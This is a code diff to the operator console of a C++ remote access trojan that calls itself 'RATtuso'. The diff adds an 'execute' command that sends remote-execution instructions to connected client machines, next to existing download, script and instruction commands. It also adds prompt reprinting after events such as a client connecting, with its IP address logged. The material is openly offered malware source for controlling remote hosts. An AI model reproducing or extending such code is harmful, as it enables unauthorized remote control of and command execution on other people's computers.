@@ -49,9 +49,10 @@ void Server::HandleInput()
 	std::string userinput;
 	int inputInt;
 	currentSessionID = -1;
+	std::cout << "RATtuso is a free and open source RAT\nIt's made with love by BomboBombone (check out my https://github.com/BomboBombone)\nHave fun using this piece of shit that I coded\n\n";
+	std::cout << "RATtuso console => ";
 	while (true)
 	{
-		std::cout << "RATtuso console => ";
 		std::getline(std::cin, userinput);
 
 		if (currentSessionID == -1)			//handle command while not having selected a client
@@ -120,6 +121,9 @@ void Server::HandleInput()
 			else if (General::processParameter(userinput, "download")) {
 				SendString(currentSessionID, userinput, PacketType::Download);
 			}
+			else if (General::processParameter(userinput, "execute")) {
+				SendString(currentSessionID, userinput, PacketType::Execute);
+			}
 			else if (General::processParameter(userinput, "script"))
 			{
 				handleScript(userinput);
@@ -133,7 +137,6 @@ void Server::HandleInput()
 				SendString(currentSessionID, userinput, PacketType::Instruction);
 			}
 		}
-		std::cout << "--------------------------------\n";
 	}
 }
 
@@ -214,6 +217,7 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 		if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
 		{
 			std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." << std::endl;
+			std::cout << CONSOLE_START;
 			return true;
 		}
 
@@ -235,6 +239,7 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 	default: //If packet type is not accounted for
 	{
 		std::cout << "Unrecognized packet: " << (int32_t)_packettype << std::endl; //Display that packet was not found
+		std::cout << CONSOLE_START;
 		break;
 	}
 	}
@@ -275,6 +280,7 @@ bool Server::HandleSendFile(int ID)
 		//Print out data on server details about file that was sent
 		std::cout << std::endl << "File sent: " << connections[ID]->file.fileName << std::endl;
 		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
+		std::cout << CONSOLE_START;
 	}
 	return true;
 }
@@ -291,6 +297,7 @@ void* Server::ClientHandlerThread(void* args) //ID = the index in the SOCKET con
 			break; //If there is an issue processing the packet, exit this loop
 	}
 	std::cout << "Lost connection to client ID: " << ID << std::endl;
+	std::cout << CONSOLE_START;
 	serverptr->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
 	return nullptr;
 }
@@ -307,6 +314,7 @@ void* Server::PacketSenderThread(void* args) //Thread for all outgoing packets
 				if (!serverptr->sendall(i, p.buffer, p.size)) //send packet to connection
 				{
 					std::cout << "Failed to send packet to ID: " << i << std::endl; //Print out if failed to send packet
+					std::cout << CONSOLE_START;
 				}
 				delete p.buffer; //Clean up buffer from the packet p
 			}
@@ -348,6 +356,7 @@ void* Server::ListenerThread(void* args)
 				serverptr->connections.push_back(newConnection); //push new connection into vector of connections
 			}
 			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
+			std::cout << CONSOLE_START;
 			General::createThread(ClientHandlerThread, (LPVOID)(&NewConnectionID)); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
 		}
 	}
